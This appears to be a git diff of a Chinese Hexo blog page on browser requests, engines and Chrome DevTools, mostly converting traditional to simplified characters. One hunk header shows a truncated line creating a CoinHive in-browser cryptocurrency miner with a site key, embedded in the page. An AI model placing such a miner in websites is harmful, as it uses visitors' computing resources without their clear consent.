@@ -25,7 +25,7 @@
 <meta property="og:image" content="https://muxiaobai.github.io/2018/06/07/浏览器的请求与响应过程/load.png">
 <meta property="og:image" content="https://muxiaobai.github.io/2018/06/07/浏览器的请求与响应过程/timing-overview.png">
 <meta property="og:image" content="https://muxiaobai.github.io/2018/06/07/浏览器的请求与响应过程/dom-navtiming.png">
-<meta property="og:updated_time" content="2018-06-08T07:29:18.665Z">
+<meta property="og:updated_time" content="2018-06-08T07:56:32.534Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="浏览器的请求与响应过程">
 <meta name="twitter:description" content="从浏览器的请求响应，重新认识chrome">
@@ -160,10 +160,10 @@
                 <div class="tips-box hide">
                     <div class="tips-arrow"></div>
                     <ul class="tips-inner">
-                        <li>菜單</li>
-                        <li>標籤</li>
+                        <li>菜单</li>
+                        <li>标签</li>
                         
-                        <li>友情鏈接</li>
+                        <li>友情链接</li>
                         
                         
                     </ul>
@@ -282,7 +282,7 @@
             </nav>
         </header>                
     </div>
-    <link class="menu-list" tags="標籤" friends="友情鏈接" about="關於我"/>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
       <div class="body-wrap"><article id="post-浏览器的请求与响应过程" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -368,8 +368,9 @@
 <li>firefox: Gecko(Mozilla)</li>
 <li>Safari: Webkit</li>
 <li>Chrome Blink</li>
-<li>Opera: Presto,&#x73B0;&#x4F7F;&#x7528;Chrome&#x7684;Blink<br>&#x6CE8;&#xFF1A;Blink&#x662F;Chromium&#x7684;&#x6838;&#x5FC3;,&#x5B83;&#x7684;&#x524D;&#x8EAB;&#x662F;Webkit.&#x56FD;&#x5185;&#x7684;&#x5927;&#x90E8;&#x5206;&#x6D4F;&#x89C8;&#x5668;,&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x5185;&#x6838;&#x662F;Trident&#xFF0C;&#x7136;&#x540E;&#x518D;&#x589E;&#x52A0;&#x4E00;&#x4E2A;&#x5176;&#x4ED6;&#x5185;&#x6838;&#x3002;&#x56FD;&#x5185;&#x7684;&#x5382;&#x5546;&#x4E00;&#x822C;&#x628A;&#x5176;&#x4ED6;&#x5185;&#x6838;&#x53EB;&#x505A;&#x201C;&#x9AD8;&#x901F;&#x6D4F;&#x89C8;&#x6A21;&#x5F0F;&#x201D;&#xFF0C;&#x800C;Trident&#x5219;&#x662F;&#x201C;&#x517C;&#x5BB9;&#x6D4F;&#x89C8;&#x6A21;&#x5F0F;&#x201D;&#xFF0C;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x6765;&#x56DE;&#x5207;&#x6362;&#x3002;</li>
+<li>Opera: Presto,&#x73B0;&#x4F7F;&#x7528;Chrome&#x7684;Blink</li>
 </ul>
+<p>&#x6CE8;&#xFF1A;Blink&#x662F;Chromium&#x7684;&#x6838;&#x5FC3;,&#x5B83;&#x7684;&#x524D;&#x8EAB;&#x662F;Webkit.&#x56FD;&#x5185;&#x7684;&#x5927;&#x90E8;&#x5206;&#x6D4F;&#x89C8;&#x5668;,&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x5185;&#x6838;&#x662F;Trident&#xFF0C;&#x7136;&#x540E;&#x518D;&#x589E;&#x52A0;&#x4E00;&#x4E2A;&#x5176;&#x4ED6;&#x5185;&#x6838;&#x3002;&#x56FD;&#x5185;&#x7684;&#x5382;&#x5546;&#x4E00;&#x822C;&#x628A;&#x5176;&#x4ED6;&#x5185;&#x6838;&#x53EB;&#x505A;&#x201C;&#x9AD8;&#x901F;&#x6D4F;&#x89C8;&#x6A21;&#x5F0F;&#x201D;&#xFF0C;&#x800C;Trident&#x5219;&#x662F;&#x201C;&#x517C;&#x5BB9;&#x6D4F;&#x89C8;&#x6A21;&#x5F0F;&#x201D;&#xFF0C;&#x7528;&#x6237;&#x53EF;&#x4EE5;&#x6765;&#x56DE;&#x5207;&#x6362;&#x3002;</p>
 <h2 id="chrome-F12&#x5F00;&#x53D1;&#x8005;&#x5DE5;&#x5177;"><a href="#chrome-F12&#x5F00;&#x53D1;&#x8005;&#x5DE5;&#x5177;" class="headerlink" title="chrome F12&#x5F00;&#x53D1;&#x8005;&#x5DE5;&#x5177;"></a>chrome F12&#x5F00;&#x53D1;&#x8005;&#x5DE5;&#x5177;</h2><p>&#x5E38;&#x7528;&#x9762;&#x677F;: Console Elements Sources<br>&#x7F51;&#x7EDC;&#x95EE;&#x9898;: Network Audits<br>&#x6027;&#x80FD;&#x5176;&#x4ED6;: Application Performance Momery</p>
 <ul>
 <li>Elements: &#x6700;&#x7EC8;&#x6D4F;&#x89C8;&#x5668;&#x5C55;&#x793A;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x5230;&#x5143;&#x7D20;&#x7684;&#x6837;&#x5F0F;Style&#xFF0C;&#x8BA1;&#x7B97;&#x51FA;&#x6765;&#x7684;&#x5143;&#x7D20;&#x4F4D;&#x7F6E;Computed&#xFF0C;&#x4E8B;&#x4EF6;&#x7684;&#x76D1;&#x542C;Event&#xFF1B;</li>
@@ -482,17 +483,17 @@
   
     
     <div class="copyright">
-        <p><span>本文標題:</span><a href="/2018/06/07/浏览器的请求与响应过程/">浏览器的请求与响应过程</a></p>
-        <p><span>文章作者:</span><a href="/" title="回到主頁">Mu Xiaobai(慕小白)</a></p>
-        <p><span>發布時間:</span>2018-06-07, 01:42:22</p>
-        <p><span>最後更新:</span>2018-06-08, 07:29:18</p>
+        <p><span>本文标题:</span><a href="/2018/06/07/浏览器的请求与响应过程/">浏览器的请求与响应过程</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Mu Xiaobai(慕小白)</a></p>
+        <p><span>发布时间:</span>2018-06-07, 01:42:22</p>
+        <p><span>最后更新:</span>2018-06-08, 07:56:32</p>
         <p>
-            <span>原始鏈接:</span><a class="post-url" href="/2018/06/07/浏览器的请求与响应过程/" title="浏览器的请求与响应过程">https://muxiaobai.github.io/2018/06/07/浏览器的请求与响应过程/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://muxiaobai.github.io/2018/06/07/浏览器的请求与响应过程/　　作者: Mu Xiaobai(慕小白)" title="點擊複製文章鏈接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/06/07/浏览器的请求与响应过程/" title="浏览器的请求与响应过程">https://muxiaobai.github.io/2018/06/07/浏览器的请求与响应过程/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://muxiaobai.github.io/2018/06/07/浏览器的请求与响应过程/　　作者: Mu Xiaobai(慕小白)" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
-            <span>許可協議:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"姓名標示-非商業性-相同方式分享 4.0 國際"</a> 轉載請保留原文鏈接及作者。
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
         </p>
     </div>
 
@@ -519,7 +520,7 @@
 </article>
 
     <div id="toc" class="toc-article">
-    <strong class="toc-title">文章目錄</strong>
+    <strong class="toc-title">文章目录</strong>
     <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DOMContentLoaded-Load-两个事件"><span class="toc-number">1.</span> <span class="toc-text">DOMContentLoaded   Load 两个事件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DOMContentLoaded-jquery-ready事件"><span class="toc-number">1.0.1.</span> <span class="toc-text">DOMContentLoaded/ jquery ready事件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#load-onload-事件"><span class="toc-number">1.0.2.</span> <span class="toc-text">load/onload 事件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#各大浏览器内核介绍"><span class="toc-number">2.</span> <span class="toc-text">各大浏览器内核介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#chrome-F12开发者工具"><span class="toc-number">3.</span> <span class="toc-text">chrome F12开发者工具</span></a></li></ol>
 </div>
 <style>
@@ -529,10 +530,10 @@
     }
 </style>
 
-<input type="button" id="tocButton" value="隱藏目錄"  title="點擊按鈕隱藏或者顯示文章目錄">
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
 <script>
-    yiliaConfig.toc = ["隱藏目錄", "顯示目錄", !!"false"];
+    yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
 </script>
 
 
@@ -608,14 +609,14 @@
                 2016-2018 Mu Xiaobai(慕小白)
             </div>
             <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank" title="快速、簡潔且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="簡而不減 Hexo 雙欄博客主題  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
             </div>
         </div>
         
             <div class="visit">
                 
                     <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" >本站到訪數: 
+                        <span id="site-visit" >本站到访数: 
                             <span id="busuanzi_value_site_uv"></span>
                         </span>
                     </span>
@@ -625,7 +626,7 @@
                 
                 
                     <span id="busuanzi_container_page_pv" style='display:none'>
-                        <span id="page-visit">本頁閱讀量: 
+                        <span id="page-visit">本页阅读量: 
                             <span id="busuanzi_value_page_pv"></span>
                         </span>
                     </span>
@@ -690,9 +691,9 @@ var miner = new CoinHive.Anonymous('4vmXkBOL0LsDsFLNY9UqbMlRxhGnXkAR', {throttle
 
 
 <div class="scroll" id="scroll">
-    <a href="#" title="返回頂部"><i class="fa fa-arrow-up"></i></a>
-    <a href="#comments" onclick="load$hide();" title="查看評論"><i class="fa fa-comments-o"></i></a>
-    <a href="#footer" title="轉到底部"><i class="fa fa-arrow-down"></i></a>
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
 </div>
 <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
 </script>
